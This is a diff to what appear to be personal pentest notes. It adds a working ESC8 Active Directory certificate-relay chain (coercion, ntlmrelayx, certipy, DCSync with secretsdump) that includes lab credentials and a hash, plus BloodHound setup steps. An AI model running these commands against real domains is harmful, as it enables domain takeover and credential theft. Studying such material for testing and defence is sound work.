@@ -1045,6 +1045,24 @@ we can go check the user and see if we can get access to that user ,
 then once we do , we can use certipy with -vulnerable to be able to get the ESC number ,
 and from there we can go and check how to abuse it . 
 
+# ESC8 Abuse :
+
+- Coercing authentication from a high-privileged machine account (e.g. DC$) using tools like Coercer or PetitPotam , nxc ... 
+- Relaying that authentication to the Web Enrollment endpoint using ntlmrelayx
+- Requesting a certificate on behalf of the coerced account
+- Using that certificate to authenticate as the account via PKINIT and obtain a TGT
+
+==> Guide : https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/adcs/esc8
+certipy-ad find -u 'Username' -p 'Password' -dc-ip $target -vulnerable 
+==> Setup the relay server : 
+impacket-ntlmrelayx -t http://$target/certsrv/certfnsh.asp -smb2support --adcs --template DomainController 
+==> Coercion via NXC :
+nxc smb $target -u 'BBROWN' -p '12345678' -M coerce_plus -o LISTENER=Our_IP
+==> Request the Ticket as the Coerced account . 
+certipy auth -pfx ./DC01.shadow.gate.pfx -dc-ip $target
+==> Perform a DCSync using the DC01 machine account . 
+impacket-secretsdump 'DC01$'@$target -hashes :57867e655d1abc9f45fd6e954e351531
+
 ```
 
 ### PowerShell Passwords Extraction :
@@ -1145,7 +1163,15 @@ apt install docker-compose
 curl -L https://ghst.ly/getbhce -o docker-compose.yml 
 docker-compose pull && docker-compose up -d 
 docker-compose logs bloodhound | grep -i passw
-localhost:8080 . 
+localhost:8080 .
+
+# Newest Method :
+https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart
+wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
+tar -xvzf bloodhound-cli-linux-amd64.tar.gz
+sudo ./bloodhound-cli install
+./bloodhound-cli resetpwd
+Visit : http://localhost:8080/ui/login 
 
 # Other method : 
 bloodhound-setup 
